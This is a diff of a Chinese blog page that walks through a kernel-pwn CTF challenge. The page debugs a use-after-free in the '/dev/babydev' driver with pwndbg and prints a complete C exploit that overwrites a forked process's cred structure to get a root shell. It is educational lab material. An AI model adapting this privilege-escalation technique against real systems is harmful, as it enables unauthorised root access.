@@ -33,9 +33,16 @@
 <meta property="og:image" content="https://i.loli.net/2021/11/26/nBNH15Ljvui4h9M.png">
 <meta property="og:image" content="https://i.loli.net/2021/11/26/61duVwijf4W7ne8.png">
 <meta property="og:image" content="https://i.loli.net/2021/11/26/VQCUvldZN5m4iTX.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/GiHZuh1bTyIlSrP.png">
 <meta property="og:image" content="https://i.loli.net/2021/11/26/26bMHJBQlRP4txE.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/RKpZ82xnbh6gjG7.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/dGZBijPYtykXgoH.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/F9ehRB4EYdU8Ios.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/yrLoUj71Kt9nYVe.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/uTG38qNi2InX9Dw.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/jWumwtFnNxlqSBI.png">
 <meta property="article:published_time" content="2021-11-26T05:52:34.000Z">
-<meta property="article:modified_time" content="2021-11-29T07:56:08.351Z">
+<meta property="article:modified_time" content="2021-11-29T11:52:47.766Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="kernel pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -208,7 +215,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      6.3k 字
+      7.1k 字
     </span>
   
 
@@ -217,7 +224,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      20 分钟
+      22 分钟
     </span>
   
 
@@ -311,12 +318,28 @@
 <p><img src="https://i.loli.net/2021/11/26/61duVwijf4W7ne8.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后再运行exp</p>
 <p><img src="https://i.loli.net/2021/11/26/VQCUvldZN5m4iTX.png" srcset="/img/loading.gif" lazyload alt="image-20211126172539904"></p>
-<p>这样就可以断下来了，在kmalloc函数前停一下，注意他执行完的返回值rax为0xffff88003cce3f00</p>
+<p>这样就可以断下来了，在kmalloc函数前停一下，rdi是0xa8正好是cred结构体的大小，同时注意他执行完的返回值rax为<strong>0xffff88003cce3f00</strong>，那么这个地址大概就相当于用户态执行完malloc返回的堆地址（现在对内核中的内存不配还不是很熟悉，只能根据用户态的思维来猜测了）。</p>
+<p><img src="https://i.loli.net/2021/11/29/GiHZuh1bTyIlSrP.png" srcset="/img/loading.gif" lazyload alt="image-20211129160630007"></p>
 <p><img src="https://i.loli.net/2021/11/26/26bMHJBQlRP4txE.png" srcset="/img/loading.gif" lazyload alt="image-20211126173400995"></p>
-<p>然后按c，运行到babyrelease函数，在kfree那里停一下，观察rdi</p>
+<p>然后按c，运行到babyrelease函数，在kfree那里停一下，观察rdi，发现也是<strong>0xffff88003cce3f00</strong>，用户态free的第一个参数也是堆块地址，free掉之后那么这段内存区域应该就是空闲的了，然后下次如果需要分配和0xa8大小相近的内存内核就有可能把这个空闲的堆块继续分配出去。</p>
+<p><img src="https://i.loli.net/2021/11/29/RKpZ82xnbh6gjG7.png" srcset="/img/loading.gif" lazyload></p>
+<p>按照exp的流程，程序马上就要执行fork了,用户态的fork函数最终会调用内核里的do_fork，在do_fork函数里调用copy_process函数来创建子进程的进程描述符以及相关的数据结构。这个函数代码量很多，也比较复杂，就不多说了（贴个<a target="_blank" rel="noopener" href="http://edsionte.com/techblog/archives/2141">链接</a>感兴趣的可以看看）。fork调用流程参考](<a target="_blank" rel="noopener" href="https://verf1sh.github.io/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/#%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6">https://verf1sh.github.io/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/#%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6</a>)</p>
+<p>于是在pwndbg里面在copy_process函数下个断点，运行过去</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">b copy_process<br>c<br></code></pre></td></tr></table></figure>
+
+<p>此时这个内存地址还啥内容都没有</p>
+<p><img src="https://i.loli.net/2021/11/29/dGZBijPYtykXgoH.png" srcset="/img/loading.gif" lazyload alt="image-20211129162154761"></p>
+<p>那么我们就再finish指令执行完copy_process函数，这时可以看到，这个内存地址里多了很多内容</p>
+<p><img src="https://i.loli.net/2021/11/29/F9ehRB4EYdU8Ios.png" srcset="/img/loading.gif" lazyload alt="image-20211129162045571"></p>
+<p>若前面的都没错，那么再调用babywrite函数的时候，我们就有机会对cred进行写操作了，下个断点</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">b babywrite<br>c<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/29/yrLoUj71Kt9nYVe.png" srcset="/img/loading.gif" lazyload alt="image-20211129163611100"></p>
+<p>马上就要执行<code>_copy_from_user</code>函数了，rsi就是我们exp里定义的zeros数组地址，初始化了28个0，那么就看看这个函数执行完之后，内存地址是啥样的。3*8+4正好是28个0。</p>
+<p><img src="https://i.loli.net/2021/11/29/uTG38qNi2InX9Dw.png" srcset="/img/loading.gif" lazyload alt="image-20211129163929714"></p>
+<p>最后执行完用户态的system(“/bin/sh”)就有了root的shell了</p>
+<p><img src="https://i.loli.net/2021/11/29/jWumwtFnNxlqSBI.png" srcset="/img/loading.gif" lazyload alt="image-20211129192113396"></p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stropts.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">// 打开两次设备</span><br>	<span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>	<span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>	<span class="hljs-comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span><br>	ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br><br>	<span class="hljs-comment">// 释放 fd1</span><br>	close(fd1);<br><br>	<span class="hljs-comment">// cred结构体和刚刚释放的babydev_struct大小相等</span><br>	<span class="hljs-comment">//按照用户态堆块分配规则的话，新起进程的cred会把刚刚释放的babydev_struct申请回来</span><br>	<span class="hljs-keyword">int</span> pid = fork();<br>	<span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fork error!&quot;</span>);<br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span><br>		<span class="hljs-keyword">char</span> zeros[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>		write(fd2, zeros, <span class="hljs-number">28</span>);<br><br>		<span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>		&#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] root now.&quot;</span>);<br>			system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>	&#125;<br>	<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		wait(<span class="hljs-literal">NULL</span>);<br>	&#125;<br>	close(fd2);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-
 
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HdXa20H57rBki5_K_ex67A">https://mp.weixin.qq.com/s/HdXa20H57rBki5_K_ex67A</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/255884">https://www.anquanke.com/post/id/255884</a></p>
@@ -327,6 +350,13 @@
             <hr>
             <div>
               <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PWN/">PWN</a>
+                    
+                  </div>
                 
                 
                   <div class="post-meta">
